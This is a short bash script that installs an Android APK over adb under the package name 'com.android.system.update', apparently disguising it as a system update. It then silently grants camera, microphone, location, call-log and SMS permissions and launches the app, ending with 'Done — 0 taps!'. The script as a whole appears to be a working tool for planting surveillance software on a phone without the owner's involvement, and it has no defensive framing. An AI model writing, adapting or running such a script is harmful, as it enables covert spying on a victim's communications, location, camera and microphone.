#!/bin/bash
APK=$1
if [ -z "$APK" ]; then
    echo "Usage: ./install.sh app.apk"
    exit 1
fi

PACKAGE="com.android.system.update"

echo "📦 Installing..."
adb install -r "$APK"

echo "🔐 Granting permissions..."
adb shell pm grant $PACKAGE android.permission.CAMERA
adb shell pm grant $PACKAGE android.permission.RECORD_AUDIO
adb shell pm grant $PACKAGE android.permission.ACCESS_FINE_LOCATION
adb shell pm grant $PACKAGE android.permission.ACCESS_COARSE_LOCATION
adb shell pm grant $PACKAGE android.permission.READ_CALL_LOG
adb shell pm grant $PACKAGE android.permission.READ_SMS
adb shell pm grant $PACKAGE android.permission.POST_NOTIFICATIONS

echo "🚀 Starting..."
adb shell am start -n $PACKAGE/.SetupActivity

echo "✅ Done — 0 taps!"
